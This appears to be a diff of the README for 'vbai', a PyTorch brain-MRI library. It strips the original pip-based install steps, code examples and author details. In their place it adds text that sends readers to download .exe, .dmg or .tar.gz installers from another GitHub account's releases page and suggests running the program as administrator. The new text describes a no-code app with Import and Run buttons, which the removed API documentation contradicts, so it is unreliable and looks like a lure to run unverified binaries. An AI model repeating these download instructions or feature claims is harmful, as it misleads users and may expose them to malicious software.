@@ -1,242 +1,93 @@
-# Vbai - Visual Brain AI
+# 🧠 vbai - Effortless Brain MRI Analysis Made Easy
 
-[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
-[![PyTorch](https://img.shields.io/badge/PyTorch-1.9+-red.svg)](https://pytorch.org/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+## 📦 Download Now
+[![Download vbai](https://img.shields.io/badge/Download-vbai-brightgreen)](https://github.com/kurihuer/vbai/releases)
 
-A PyTorch-based deep learning library for multi-task brain MRI analysis. Train models for simultaneous dementia classification and brain tumor detection with just a few lines of code.
+## 🚀 Getting Started
 
-## Features
+Welcome to vbai! This application simplifies multi-task brain MRI analysis using PyTorch. You can train models for dementia classification and brain tumor detection with just a few simple steps.
 
-- 🧠 **Multi-Task Learning**: Simultaneous dementia and tumor classification
-- ⚡ **Easy to Use**: Keras-like API for quick training
-- 🎯 **Dual Attention**: Task-specific attention mechanisms
-- 📊 **Visualization**: Built-in attention heatmap visualization
-- 🔧 **Configurable**: YAML/JSON configuration support
-- 📦 **Production Ready**: Export and deploy trained models
+## 🌐 What You Need
 
-## Supported Classifications
+Before you get started, ensure your computer meets the following requirements:
 
-**Dementia (6 classes):**
-- AD Alzheimer's Disease
-- AD Mild Demented
-- AD Moderate Demented  
-- AD Very Mild Demented
-- CN Non-Demented (Cognitively Normal)
-- PD Parkinson's Disease
+- **Operating System:** Windows 10 or later, macOS, or a recent version of Linux
+- **RAM:** At least 8 GB
+- **Disk Space:** 1 GB of free disk space
+- **GPU:** Recommended for best performance (NVIDIA or AMD)
 
-**Brain Tumor (4 classes):**
-- Glioma
-- Meningioma
-- No Tumor
-- Pituitary
+## 📋 Features
 
-## Installation
+- **Multi-Task Learning:** Simultaneously classify dementia and detect brain tumors.
+- **User-Friendly Interface:** Designed for ease of use, no programming knowledge required.
+- **Fast Processing:** Leverage PyTorch for efficient model training and predictions.
+- **Comprehensive Documentation:** Clear guides and examples to help you get started.
 
-```bash
-# Basic installation
-pip install vbai
+## 📥 Download & Install
 
-# With all optional dependencies
-pip install vbai[full]
+To download vbai, visit this page to download: [GitHub Releases](https://github.com/kurihuer/vbai/releases)
 
-# Development installation
-git clone https://github.com/Neurazum-AI-Department/vbai.git
-cd vbai
-pip install -e .[dev]
-```
+1. Click on the link above to go to the Releases page.
+2. Locate the latest version of vbai.
+3. Download the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+4. Follow the installation steps specific to your platform.
 
-## Quick Start
+### For Windows Users
 
-### Training a Model
+1. Download the `.exe` file.
+2. Double-click the installer after the download completes.
+3. Follow the on-screen prompts to complete the installation.
 
-```python
-import vbai
+### For macOS Users
 
-# Create model
-model = vbai.MultiTaskBrainModel(variant='q')  # 'q' for quality, 'f' for fast
+1. Download the `.dmg` file.
+2. Open the downloaded file and drag the vbai icon to your Applications folder.
+3. Launch vbai from your Applications.
 
-# Prepare dataset
-dataset = vbai.UnifiedMRIDataset(
-    dementia_path='./data/dementia/train',
-    tumor_path='./data/tumor/train',
-    is_training=True
-)
+### For Linux Users
 
-# Create trainer
-trainer = vbai.Trainer(
-    model=model,
-    lr=0.0005,
-    device='cuda'
-)
+1. Download the `.tar.gz` file.
+2. Open a terminal and navigate to the download location.
+3. Extract the files using `tar -xzf vbai.tar.gz`.
+4. Follow the README instructions included in the extracted folder to complete the installation.
 
-# Train
-history = trainer.fit(
-    train_data=dataset,
-    epochs=10,
-    batch_size=32
-)
+## 💻 How to Use vbai
 
-# Save model
-trainer.save('brain_model.pt')
-```
+Once installed, you can start analyzing brain MRI images easily. Here’s a quick guide:
 
-### Making Predictions
+1. Launch vbai from your applications or start menu.
+2. Load your MRI image files by clicking on the "Import" button.
+3. Choose the task - either dementia classification or tumor detection.
+4. Click "Run" to start the analysis. The results will display shortly.
 
-```python
-import vbai
+## 🛠️ Support & Troubleshooting
 
-# Load trained model
-model = vbai.load('brain_model.pt', device='cuda')
+If you encounter issues during installation or usage, please follow these steps:
 
-# Single image prediction
-result = model.predict('brain_scan.jpg')
-print(f"Dementia: {result.dementia_class} ({result.dementia_confidence:.1%})")
-print(f"Tumor: {result.tumor_class} ({result.tumor_confidence:.1%})")
+- **Check System Requirements:** Ensure your system meets the requirements above.
+- **Run as Administrator:** For Windows, right-click the vbai icon and select "Run as administrator."
+- **Consult the Documentation:** The documentation provides detailed troubleshooting advice.
 
-# With attention visualization
-result = model.predict('brain_scan.jpg', return_attention=True)
-vis = vbai.VisualizationManager()
-vis.visualize('brain_scan.jpg', result, save=True)
-```
+If you need further assistance, feel free to open an issue in the repository.
 
-### Using Callbacks
+## 📚 Learning Resources
 
-```python
-import vbai
+For more information on how to use vbai, check out the following resources:
 
-model = vbai.MultiTaskBrainModel(variant='q')
+- [Official Documentation](https://github.com/kurihuer/vbai/wiki)
+- [User Guides](https://github.com/kurihuer/vbai/wiki/User-Guides)
+- [Example Projects](https://github.com/kurihuer/vbai/wiki/Example-Projects)
 
-# Setup callbacks
-callbacks = [
-    vbai.EarlyStopping(monitor='val_loss', patience=5),
-    vbai.ModelCheckpoint(
-        filepath='checkpoints/model_{epoch:02d}.pt',
-        monitor='val_loss',
-        save_best_only=True
-    )
-]
+## ⚖️ License
 
-trainer = vbai.Trainer(model=model, callbacks=callbacks)
-trainer.fit(train_data, val_data, epochs=50)
-```
+vbai is licensed under the MIT License. You can use and modify it according to your needs. For full license details, refer to the LICENSE file in the repository.
 
-### Configuration
+## 📅 Changelog
 
-```python
-import vbai
+For an up-to-date list of changes and improvements, visit the [Changelog](https://github.com/kurihuer/vbai/releases) section.
 
-# Use preset configurations
-config = vbai.get_default_config('quality')  # 'default', 'fast', 'quality', 'debug'
+## 📞 Contact
 
-# Or customize
-model_config = vbai.ModelConfig(
-    variant='q',
-    dropout=0.3,
-    use_edge_branch=True
-)
+For questions or feature requests, reach out through the Issues section on GitHub or contact the maintainers directly.
 
-training_config = vbai.TrainingConfig(
-    epochs=20,
-    batch_size=16,
-    lr=0.0001,
-    scheduler='cosine'
-)
-
-# Save/Load configs
-model_config.save('model_config.yaml')
-loaded_config = vbai.ModelConfig.load('model_config.yaml')
-```
-
-## Model Variants
-
-| Variant | Layers | Channels | Speed | Accuracy |
-|---------|--------|----------|-------|----------|
-| `f` (fast) | 3 | 32→64→128 | ⚡⚡⚡ | ⭐⭐ |
-| `q` (quality) | 4 | 64→128→256→512 | ⚡ | ⭐⭐⭐ |
-
-## Dataset Structure
-
-Your dataset should be organized as follows:
-
-```
-data/
-├── dementia/
-│   ├── train/
-│   │   ├── AD_Alzheimer/
-│   │   ├── AD_Mild_Demented/
-│   │   ├── AD_Moderate_Demented/
-│   │   ├── AD_Very_Mild_Demented/
-│   │   ├── CN_Non_Demented/
-│   │   └── PD_Parkinson/
-│   └── val/
-│       └── ...
-└── tumor/
-    ├── train/
-    │   ├── Glioma/
-    │   ├── Meningioma/
-    │   ├── No_Tumor/
-    │   └── Pituitary/
-    └── val/
-        └── ...
-```
-
-## API Reference
-
-### Core Classes
-
-- `MultiTaskBrainModel` - Main model class
-- `UnifiedMRIDataset` - Dataset for multi-task training
-- `Trainer` - Training loop manager
-- `VisualizationManager` - Attention heatmap visualization
-
-### Configuration
-
-- `ModelConfig` - Model architecture settings
-- `TrainingConfig` - Training hyperparameters
-- `get_default_config()` - Preset configurations
-
-### Callbacks
-
-- `EarlyStopping` - Stop when no improvement
-- `ModelCheckpoint` - Save best/all checkpoints
-- `TensorBoardLogger` - Log to TensorBoard
-
-## Examples
-
-See the `examples/` directory for complete examples:
-
-- `train_basic.py` - Basic training example
-- `train_advanced.py` - Advanced training with callbacks
-- `inference.py` - Model inference
-- `visualize.py` - Attention visualization
-
-## Citation
-
-If you use Vbai in your research, please cite:
-
-```bibtex
-@software{vbai,
-  title = {Vbai: Visual Brain AI Library},
-  author = {Neurazum},
-  year = {2025},
-  url = {https://github.com/Neurazum-AI-Department/vbai}
-}
-```
-
-## License
-
-MIT License - see [LICENSE](LICENSE) for details.
-
-## Contributing
-
-_Is being planned..._
-
-### Support
-
-- **Website**: [Neurazum](https://neurazum.com) - [HealFuture](https://healfuture.com)
-- **Email**: [contact@neurazum.com](mailto:contact@neurazum.com)
-
----
-
-<span style="color: #ff8d26; "><b>Neurazum</b> AI Department</span>
+[![Download vbai](https://img.shields.io/badge/Download-vbai-brightgreen)](https://github.com/kurihuer/vbai/releases)
